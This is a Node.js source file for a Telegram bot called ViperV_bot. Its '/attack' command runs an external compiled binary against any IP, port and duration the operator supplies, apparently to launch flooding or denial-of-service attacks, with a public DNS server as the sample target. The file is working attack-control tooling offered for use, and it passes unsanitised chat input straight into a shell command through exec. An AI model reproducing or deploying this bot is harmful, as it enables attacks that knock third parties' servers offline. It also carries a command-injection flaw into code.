const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const bot = new Telegraf(process.env.BOT_TOKEN);
const BINARY_PATH = '/app/v';
const ALLOWED_USER_ID = '8743980380';

// Check if binary exists on startup
if (fs.existsSync(BINARY_PATH)) {
  console.log('✅ Binary found at', BINARY_PATH);
  fs.chmodSync(BINARY_PATH, '755');
} else {
  console.log('❌ Binary NOT found at', BINARY_PATH);
  // Try current directory
  const localPath = path.join(__dirname, 'v');
  if (fs.existsSync(localPath)) {
    console.log('✅ Binary found at', localPath);
    fs.chmodSync(localPath, '755');
  }
}

bot.command('attack', async (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  
  const args = ctx.message.text.split(' ');
  if (args.length < 4) {
    return ctx.reply('Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 8.8.8.8 80 10');
  }
  
  const ip = args[1];
  const port = args[2];
  const duration = args[3];
  
  // Try different binary paths
  let binaryPath = '/app/v';
  if (!fs.existsSync(binaryPath)) {
    binaryPath = path.join(__dirname, 'v');
  }
  
  const command = `${binaryPath} ${ip} ${port} ${duration}`;
  
  await ctx.reply(`🎯 Attacking ${ip}:${port} for ${duration}s`);
  
  exec(command, { timeout: duration * 1000 + 5000 }, (error, stdout, stderr) => {
    const output = stdout || stderr || error?.message || 'Completed';
    ctx.reply(`✅ Result:\n${output.slice(0, 4000)}`);
  });
});

bot.command('status', async (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  
  // Check if binary exists
  let found = false;
  let info = '';
  
  if (fs.existsSync('/app/v')) {
    found = true;
    const stats = fs.statSync('/app/v');
    info = `Size: ${(stats.size / 1024).toFixed(2)} KB`;
  } else if (fs.existsSync(path.join(__dirname, 'v'))) {
    found = true;
    const stats = fs.statSync(path.join(__dirname, 'v'));
    info = `Size: ${(stats.size / 1024).toFixed(2)} KB (local)`;
  }
  
  if (found) {
    ctx.reply(`✅ Binary ready\n${info}`);
  } else {
    ctx.reply('❌ Binary not found. Railway failed to compile v.cpp');
  }
});

bot.command('start', (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  ctx.reply('🔷 ViperV_bot ready!\nUse /attack <IP> <PORT> <DURATION>\nUse /status to check binary');
});

bot.launch();
console.log('ViperV_bot started');
